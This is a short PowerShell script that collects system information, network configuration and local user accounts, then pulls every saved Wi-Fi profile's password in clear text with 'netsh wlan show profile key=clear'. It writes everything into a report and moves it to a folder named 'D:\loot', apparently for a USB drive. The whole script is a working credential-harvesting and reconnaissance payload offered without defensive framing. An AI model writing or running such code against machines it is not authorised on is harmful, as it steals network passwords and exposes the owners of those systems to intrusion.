# PowerShell script to gather system info, network config, users, and WLAN profiles with passwords
# Requires administrative privileges

$outputFile = "C:\Users\Public\Documents\SystemInfoReport.txt"
$destinationPath = "D:\loot\SystemInfoReport.txt"

# Clear existing output file if any
if (Test-Path $outputFile) {
    Remove-Item $outputFile
}

"===== System Information =====" | Out-File -FilePath $outputFile -Encoding UTF8

# Get system information
Get-ComputerInfo | Out-File -FilePath $outputFile -Encoding UTF8 -Append

"`n===== Network Configuration =====" | Out-File -FilePath $outputFile -Encoding UTF8 -Append

# Get network configuration
Get-NetIPConfiguration | Out-File -FilePath $outputFile -Encoding UTF8 -Append

"`n===== User Accounts =====" | Out-File -FilePath $outputFile -Encoding UTF8 -Append

# Get list of local users
Get-LocalUser  | Format-Table Name,Enabled,LastLogon | Out-String | Out-File -FilePath $outputFile -Encoding UTF8 -Append

"`n===== WLAN Profiles and Passwords =====" | Out-File -FilePath $outputFile -Encoding UTF8 -Append

# Get WLAN profiles and passwords
$profilesRaw = netsh wlan show profiles
# Extract profile names
$profileNames = ($profilesRaw | Select-String "All User Profile\s*:\s*(.+)$" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })

if ($profileNames.Count -eq 0) {
    "No WLAN profiles found." | Out-File -FilePath $outputFile -Encoding UTF8 -Append
} else {
    foreach ($ssid in $profileNames) {
        # Get profile details including clear key (password)
        $profileDetail = netsh wlan show profile name="$ssid" key=clear
        # Extract Key Content line for password
        $keyLine = $profileDetail | Select-String "Key Content\s*:\s*(.+)$"
        if ($keyLine) {
            $password = $keyLine.Matches[0].Groups[1].Value.Trim()
        } else {
            $password = "<No password found or profile is open>"
        }
        "$ssid : $password" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    }
}

# Move the output file to the destination path
if (-Not (Test-Path "D:\loot")) {
    New-Item -ItemType Directory -Path "D:\loot"
}
Move-Item -Path $outputFile -Destination $destinationPath

Write-Host "System information report generated and moved to $destinationPath"